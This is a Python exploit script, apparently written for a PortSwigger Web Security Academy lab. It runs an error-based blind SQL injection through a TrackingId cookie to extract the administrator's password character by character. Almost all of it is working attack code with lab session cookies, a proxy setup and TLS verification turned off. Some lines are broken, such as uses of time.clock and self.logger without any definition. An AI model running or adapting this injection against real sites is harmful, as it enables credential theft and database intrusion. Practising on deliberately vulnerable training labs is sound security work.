import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxy = {'https': 'https://127.0.0.1:8080'}
#pip install urllib3==1.25.11 in case of a bug with porxy
#"session=xEIt1nqdAI0hKSrD83z0y9eCtq6jZ2Ee,TrackingId=rpQc5hhMLsyUJB6t${payload}" https://target-ac741f641f40597d80a30d2200a00075.web-security-academy.net/
def get_password(url):
    password = ""
    for i in range (1,21):
        for j in range(47,126):
    
            payload = "' || (select TO_CHAR(1/0) FROM users WHERE username='administrator' and ASCII(SUBSTR(password,%s,1))='%s')|| '" % (i,j)
            #print(payload)
            payload_enconded = urllib.parse.quote(payload)
            cookies = {'TrackingId': 'cP0mI6ybRlWc61eX' + payload_enconded, 'session':'ytvFqEi2W3nBjNinnKQ9iz0XcF5EjJq0'}
            start = time.clock()
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxy)
            request_time = time.clock() - start
            self.logger.info("Request completed in {0:.0f}ms".format(request_time))
            if r.status_code == 200:
                sys.stdout.write('\r' + password + chr(j))
                sys.stdout.flush()
            elif r.status_code == 500:
                password += chr(j)
                sys.stdout.write('\r' + password)
                sys.stdout.flush()
                break

            #print(r.text)
    #password = ""
    #print(password)

def main():
    if len(sys.argv) != 2:
        print("FORMAT: sqli.py url")
        exit()
    
    url = sys.argv[1]
    get_password(url)
    



if __name__ == "__main__":
    main()